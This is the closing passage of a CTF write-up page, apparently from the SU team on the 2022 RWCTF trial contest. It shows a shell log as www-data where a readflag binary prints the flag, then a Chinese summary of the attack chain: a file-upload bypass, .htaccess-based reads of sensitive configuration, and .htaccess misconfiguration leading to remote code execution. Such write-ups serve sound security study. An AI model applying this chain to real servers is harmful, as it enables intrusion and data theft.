var</span><br><span class="line">www-data@a17ac98d17ba:/$ readflag</span><br><span class="line">readflag</span><br><span class="line">bash: readflag: <span class="built_in">command</span> not found</span><br><span class="line">www-data@a17ac98d17ba:/$ ./readflag</span><br><span class="line">./readflag</span><br><span class="line">Solve the easy challenge first</span><br><span class="line">(((((-<span class="number">854089</span>)-(<span class="number">772258</span>))+(5324))+(474988))-(-472881))</span><br><span class="line">input your answer: -673154</span><br><span class="line">ok! here is your flag!!</span><br><span class="line">rwctf&#123;cd81450983c06bcb4438dfb8de45ec04&#125;www-data@a17ac98d17ba:/$ </span><br></pre></td></tr></table></figure>

<h2><span id="wrap-up">Wrap up</span><a href="#wrap-up" class="header-anchor"></a></h2><p>总体思路与知识点</p>
<ol>
<li>代码审计 </li>
<li>proto 利用 | 发现双文件上传 bypass</li>
<li>利用 htaccess 越界读 获取 一些敏感配置文件</li>
<li>利用 htaccess 和 一些错误配置 RCE</li>
</ol>
</div><div class="article-licensing box"><div class="licensing-title"><p>2022 RWCTF体验赛 SU Writeup</p><p><a href="https://team-su.github.io/posts/24249.html">https://team-su.github.io/posts/24249.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-01-30</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-13</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/RWCTF/">RWCTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/52932.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2022 SUSCTF SU Writeup</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/65490.html"><span class="level-item">2021 SCTF SU Writeup</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><!--!--></body></html>